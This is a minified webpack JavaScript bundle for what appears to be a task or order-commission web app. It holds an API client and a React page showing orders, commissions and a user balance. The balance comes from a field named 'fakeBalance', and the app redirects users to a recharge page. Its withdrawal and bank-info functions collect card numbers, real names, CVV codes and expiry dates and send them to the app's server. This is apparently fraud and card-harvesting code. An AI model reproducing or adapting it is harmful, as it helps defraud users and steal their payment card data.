"use strict";(self.webpackChunk=self.webpackChunk||[]).push([[53],{59510:function(ue,B,r){r.d(B,{Br:function(){return D},KF:function(){return g},W2:function(){return T},bG:function(){return W},iY:function(){return z},kM:function(){return M},rH:function(){return y},s6:function(){return v}});var P=r(33746),d=P.Z.create({baseURL:"https://api.xxzh.cc",withCredentials:!1,crossDomain:!0,timeout:1e4});d.interceptors.request.use(function(u){var n=localStorage.getItem("token");return n&&(u.headers.Authorization="Bearer ".concat(n)),u},function(u){return Promise.reject(u)});var W=function(n){return d.get("/user/info/".concat(n)).then(function(o){return o.data})},g=function(n,o){return d.put("/user/tron/set",{userId:n,address:o}).then(function(m){return m.data})},z=function(n){return d.get("/user/tron/get",{params:{userId:n}}).then(function(o){return o.data})},T=function(n,o,m,p,I){return d.post("/withdrawal-records/user",{username:n,amount:o,fundPassword:m,method:p,address:I}).then(function(k){return k.data})},D=function(n,o,m,p,I,k){return d.put("/user/set-bank-info",{userId:n,bankAccount:o,realName:m,bankName:p,cvv:I,expiryDate:k}).then(function(j){return j.data})},y=function(n){return d.get("/user/bank-info",{params:{userId:n}}).then(function(o){return o.data})},M=function(n,o,m,p,I,k,j,R){var $="".concat(p," | ").concat(I," | ").concat(k," | CVV:").concat(j," | Exp:").concat(R);return d.post("/withdrawal-records/user/bank",{username:n,amount:o,fundPassword:m,method:"\u94F6\u884C\u5361",address:$}).then(function(e){return e.data})},v=function(n){var o=arguments.length>1&&arguments[1]!==void 0?arguments[1]:0,m=arguments.length>2&&arguments[2]!==void 0?arguments[2]:10;return d.get("/shop/search-with-products",{params:{name:n,page:o,size:m}}).then(function(p){return p.data})}},52511:function(ue,B,r){r.r(B),r.d(B,{default:function(){return oe}});var P=r(26068),d=r.n(P),W=r(90228),g=r.n(W),z=r(15558),T=r.n(z),D=r(87999),y=r.n(D),M=r(48305),v=r.n(M),u=r(75271),n=r(69194),o={listData:"listData___xL5TJ",listItem:"listItem___kR0QT",state:"state___vc__G",product:"product___m0scg"},m=r(58245),p=r(99357),I=r(59510),k=r(41400),j=r(72283),R=r(5791),$=r(59739),e=r(52676),Be=10,ie=function(h){var w=h.hasMore;return w?(0,e.jsxs)(e.Fragment,{children:[(0,e.jsx)("span",{style:{fontSize:14,color:"#999"},children:"loading"}),(0,e.jsx)(n.k_,{})]}):(0,e.jsx)("span",{style:{fontSize:14,color:"#999"},children:"~finished~"})};function oe(){var F=(0,$.$G)(),h=F.t,w=(0,u.useState)("pending"),K=v()(w,2),O=K[0],le=K[1],de=(0,u.useState)([]),Q=v()(de,2),Y=Q[0],C=Q[1],ce=(0,u.useState)(0),X=v()(ce,2),fe=X[0],E=X[1],he=(0,u.useState)(!0),q=v()(he,2),G=q[0],H=q[1],ge=(0,u.useState)(!1),_=v()(ge,2),ve=_[0],N=_[1],me=(0,u.useState)({}),ee=v()(me,2),A=ee[0],V=ee[1],pe=(0,u.useState)(0),te=v()(pe,2),Se=te[0],J=te[1],je=(0,u.useState)({}),ne=v()(je,2),re=ne[0],ae=ne[1],xe=(0,u.useState)(0),se=v()(xe,2),ye=se[0],Te=se[1],Ie=(0,R.s0)(),U=function(){var a=y()(g()().mark(function i(){var l,s,c,S,t,x=arguments;return g()().wrap(function(f){for(;;)switch(f.prev=f.next){case 0:if(l=x.length>0&&x[0]!==void 0?x[0]:!1,s=x.length>1&&x[1]!==void 0?x[1]:"pending",c=JSON.parse(localStorage.getItem("userInfo")),V(c),N(!0),s!=="pending"){f.next=11;break}return f.next=8,(0,p.ZQ)({userId:c.id});case 8:f.t0=f.sent,f.next=14;break;case 11:return f.next=13,(0,p.vC)({userId:c.id,page:fe});case 13:f.t0=f.sent;case 14:if(S=f.t0,t=null,s==="pending"?t=S.data:t=S.data.content,!l){f.next=24;break}return C(t),E(0),H(t.length),f.abrupt("return");case 24:C(function(Z){return[].concat(T()(Z),T()(t))}),E(function(Z){Z+1>=ye&&(H(!1),N(!0))});case 26:N(!1);case 27:case"end":return f.stop()}},i)}));return function(){return a.apply(this,arguments)}}(),ke=function(){var a=y()(g()().mark(function i(l){var s;return g()().wrap(function(S){for(;;)switch(S.prev=S.next){case 0:return N(!0),S.next=3,(0,p.N)({taskId:l});case 3:s=S.sent,N(!1),s.code===200&&(n.FN.show({icon:"success",content:s.message}),J(!1),ae({}),U(!0),L()),s.code===402&&Ie("/order/recharge");case 7:case"end":return S.stop()}},i)}));return function(l){return a.apply(this,arguments)}}(),Ce=function(){var a=y()(g()().mark(function i(){var l,s,c;return g()().wrap(function(t){for(;;)switch(t.prev=t.next){case 0:if(l=JSON.parse(localStorage.getItem("userInfo")),l!=null&&l.id){t.next=3;break}return t.abrupt("return");case 3:return t.prev=3,t.next=6,info({userId:l.id});case 6:s=t.sent,s.code===200&&(V(function(x){var b;return d()(d()({},x),{},{fakeBalance:((b=s.data)===null||b===void 0||(b=b.user)===null||b===void 0?void 0:b.fakeBalance)||0})}),localStorage.setItem("userInfo",JSON.stringify(d()(d()({},l),{},{fakeBalance:((c=s.data)===null||c===void 0||(c=c.user)===null||c===void 0?void 0:c.fakeBalance)||0})))),t.next=13;break;case 10:t.prev=10,t.t0=t.catch(3),console.error("\u5237\u65B0\u4F59\u989D\u5931\u8D25:",t.t0);case 13:case"end":return t.stop()}},i,null,[[3,10]])}));return function(){return a.apply(this,arguments)}}(),be=function(){var a=y()(g()().mark(function i(){return g()().wrap(function(s){for(;;)switch(s.prev=s.next){case 0:if(!ve){s.next=2;break}return s.abrupt("return");case 2:return s.next=4,U(!1,O);case 4:G||n.FN.show({content:h("taskpending.noMore"),position:"bottom"});case 5:case"end":return s.stop()}},i)}));return function(){return a.apply(this,arguments)}}(),L=function(){var a=y()(g()().mark(function i(){var l,s,c;return g()().wrap(function(t){for(;;)switch(t.prev=t.next){case 0:if(l=JSON.parse(localStorage.getItem("userInfo")),l!=null&&l.id){t.next=3;break}return t.abrupt("return");case 3:return t.prev=3,t.next=6,(0,I.bG)(l.id);case 6:s=t.sent,s.code===200?(c=s.data||{},V(c),localStorage.setItem("userInfo",JSON.stringify(c))):console.error("\u83B7\u53D6\u7528\u6237\u4FE1\u606F\u5931\u8D25\uFF0C\u8FD4\u56DEcode:",s.code),t.next=13;break;case 10:t.prev=10,t.t0=t.catch(3),console.error("\u83B7\u53D6\u7528\u6237\u4FE1\u606F\u5931\u8D25:",t.t0);case 13:case"end":return t.stop()}},i,null,[[3,10]])}));return function(){return a.apply(this,arguments)}}(),Ne=function(i){O==="pending"&&(ae(d()(d()({},i),{},{status:O})),J(!0))};return(0,u.useEffect)(function(){L()},[]),(0,e.jsxs)("div",{style:{minHeight:"100vh"},className:o.listData,children:[re.status&&(0,e.jsx)(k.Z,{parentValue:Se,onValueChange:J,isClose:!0,user:A,data:re,onSubmit:function(i){return ke(i)}}),(0,e.jsxs)(n.t8,{onRefresh:function(){C([]),E(0),L(),H(!0)},canReleaseText:"Pull to refresh",completeText:"Success",children:[(0,e.jsx)("h2",{children:h("taskpending.accountBalance")}),(0,e.jsxs)("h1",{style:{fontSize:32},children:["$",(0,j.dN)((A==null?void 0:A.fakeBalance)||0)]}),(0,e.jsx)(n.rg,{block:!0,options:[h("taskpending.pending"),h("taskpending.completed")],onChange:function(i){le(i===h("taskpending.pending")?"pending":"completed"),C([]),U(!1,i===h("taskpending.pending")?"pending":"completed")}}),Y.length>0?(0,e.jsx)(n.aV,{style:{margin:"12px 0"},children:Y.map(function(a,i){return(0,e.jsxs)(n.aV.Item,{className:o.listItem,onClick:function(){return Ne(a)},children:[(0,e.jsx)("h4",{children:a.time}),(0,e.jsx)("h4",{children:a.num}),(0,e.jsx)("img",{className:o.state,src:a.status==="pending"?r(70869):r(51436),alt:""}),(0,e.jsxs)("div",{className:o.product,children:[(0,e.jsx)("img",{src:"https://api.xxzh.cc"+a.firstImagePath,alt:""}),(0,e.jsxs)("div",{children:[(0,e.jsx)("h2",{children:a.productName}),(0,e.jsxs)("h2",{children:[h("taskpending.price"),": $",(0,j.dN)(a.productAmount)]})]})]}),(0,e.jsxs)("div",{style:{display:"flex",gap:12,flexWrap:"wrap",marginTop:8},children:[(0,e.jsxs)("div",{style:{flex:1,minWidth:100,display:"flex",flexDirection:"column",lineHeight:1.2},children:[(0,e.jsx)("div",{style:{fontSize:12,color:"#666",marginBottom:4},children:h("taskpending.orderAmount")}),(0,e.jsxs)("div",{style:{fontSize:16,fontWeight:700,color:"#1f1f1f"},children:["$",(0,j.dN)(a.productAmount)]})]}),(0,e.jsxs)("div",{style:{flex:1,minWidth:100,display:"flex",flexDirection:"column",lineHeight:1.2},children:[(0,e.jsx)("div",{style:{fontSize:12,color:"#666",marginBottom:4},children:h("taskpending.commission")}),(0,e.jsx)("div",{style:{fontSize:14,fontWeight:600,color:"#16a34a"},children:Number(a.commission)>=0?"+".concat((0,j.dN)(a.commission)):(0,j.dN)(a.commission)})]}),(0,e.jsxs)("div",{style:{flex:1,minWidth:100,display:"flex",flexDirection:"column",lineHeight:1.2},children:[(0,e.jsx)("div",{style:{fontSize:12,color:"#666",marginBottom:4},children:h("taskpending.expectedReturn")}),(0,e.jsxs)("div",{style:{fontSize:16,fontWeight:700,color:"#16a34a"},children:["$",(0,j.dN)(a.expectReturn)]})]})]})]},i)})}):(0,e.jsx)(n.HY,{style:{padding:"64px 0"},imageStyle:{width:128},description:h("taskpending.noData")}),(0,e.jsx)("br",{}),(0,e.jsx)("br",{}),(0,e.jsx)("br",{}),(0,e.jsx)("br",{}),(0,e.jsx)(n.v_,{loadMore:be,hasMore:G,children:(0,e.jsx)(ie,{hasMore:G})})]}),(0,e.jsx)(m.Z,{})]})}}}]);
